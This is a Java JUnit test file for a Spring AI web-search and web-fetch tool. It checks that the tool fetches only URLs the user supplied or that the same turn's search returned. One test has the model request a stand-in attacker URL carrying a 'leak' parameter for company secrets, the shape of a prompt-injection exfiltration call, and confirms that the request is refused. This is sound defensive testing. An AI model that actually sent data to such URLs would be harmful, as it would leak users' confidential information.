package com.onggijonggi.api.web;

import static org.assertj.core.api.Assertions.assertThat;

import java.net.URI;
import java.net.http.HttpClient;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.Test;
import org.springframework.ai.chat.model.ToolContext;
import org.springframework.boot.context.properties.bind.Bindable;
import org.springframework.boot.context.properties.bind.Binder;
import org.springframework.boot.context.properties.source.MapConfigurationPropertySource;

class WebToolsTest {

	private static final WebProperties PROPERTIES = new Binder(new MapConfigurationPropertySource())
			.bindOrCreate("app.web", Bindable.of(WebProperties.class));

	/** 읽은 주소를 기록하고 정해진 페이지를 돌려준다. */
	private static class RecordingFetcher extends WebFetcher {
		final List<URI> fetched = new ArrayList<>();

		RecordingFetcher() {
			super(HttpClient.newHttpClient(), new PublicUrlGuard(), PROPERTIES.fetch());
		}

		@Override
		Page fetch(URI start) {
			fetched.add(start);
			return new Page(start, "제목", "본문");
		}
	}

	private final RecordingFetcher fetcher = new RecordingFetcher();
	private final WebTools tools = new WebTools(PROPERTIES,
			(query, limit) -> List.of(new WebSearchProvider.Result("Spring", "https://spring.io/guides#top", "요약")), fetcher);

	@Test
	void allowsUrlsFromUserMessagesTrimmingSentencePunctuation() {
		Object allowed = tools.context(List.of("이거 읽어줘 https://Example.com/a?b=1#x. 그리고 http://test.org)")).get(WebTools.ALLOWED_URLS);
		assertThat((Set<Object>) allowed).containsExactlyInAnyOrder("https://example.com/a?b=1", "http://test.org/");
	}

	@Test
	void refusesUrlsTheModelMadeUp() {
		ToolContext context = new ToolContext(tools.context(List.of("요약해줘")));

		String answer = tools.webFetch("https://attacker.example/?leak=사내기밀", context);

		assertThat(answer).contains("읽을 수 없다");
		assertThat(fetcher.fetched).isEmpty();
	}

	@Test
	void allowsFetchingSearchResultsOfTheSameTurn() {
		ToolContext context = new ToolContext(tools.context(List.of("스프링 가이드 찾아줘")));

		assertThat(tools.webSearch("spring guides", context)).contains("1. Spring").contains("https://spring.io/guides#top");
		String answer = tools.webFetch("https://spring.io/guides", context);

		assertThat(fetcher.fetched).containsExactly(URI.create("https://spring.io/guides"));
		assertThat(answer).startsWith("[외부 웹 페이지 내용").contains("제목: 제목").contains("본문");
	}

	@Test
	void searchResultsDoNotCarryOverToAnotherTurn() {
		tools.webSearch("spring guides", new ToolContext(tools.context(List.of())));

		assertThat(tools.webFetch("https://spring.io/guides", new ToolContext(tools.context(List.of())))).contains("읽을 수 없다");
	}

	@Test
	void returnsSearchFailureAsASentenceForTheModel() {
		WebTools failing = new WebTools(PROPERTIES, (query, limit) -> {
			throw new WebToolException("DuckDuckGo가 자동 요청으로 보고 막았다");
		}, fetcher);

		assertThat(failing.webSearch("q", new ToolContext(failing.context(List.of()))))
				.isEqualTo("웹 검색을 할 수 없다: DuckDuckGo가 자동 요청으로 보고 막았다");
	}

	@Test
	void truncatesLongPagesToTheCharacterLimit() {
		WebFetcher longPage = new RecordingFetcher() {
			@Override
			Page fetch(URI start) {
				return new Page(start, "", "가".repeat(PROPERTIES.fetch().maxChars() + 10));
			}
		};
		WebTools limited = new WebTools(PROPERTIES, (query, limit) -> List.of(), longPage);

		String answer = limited.webFetch("https://a.com/", new ToolContext(limited.context(List.of("https://a.com/"))));

		assertThat(answer).contains("자에서 잘림").doesNotContain("가".repeat(PROPERTIES.fetch().maxChars() + 1));
	}
}
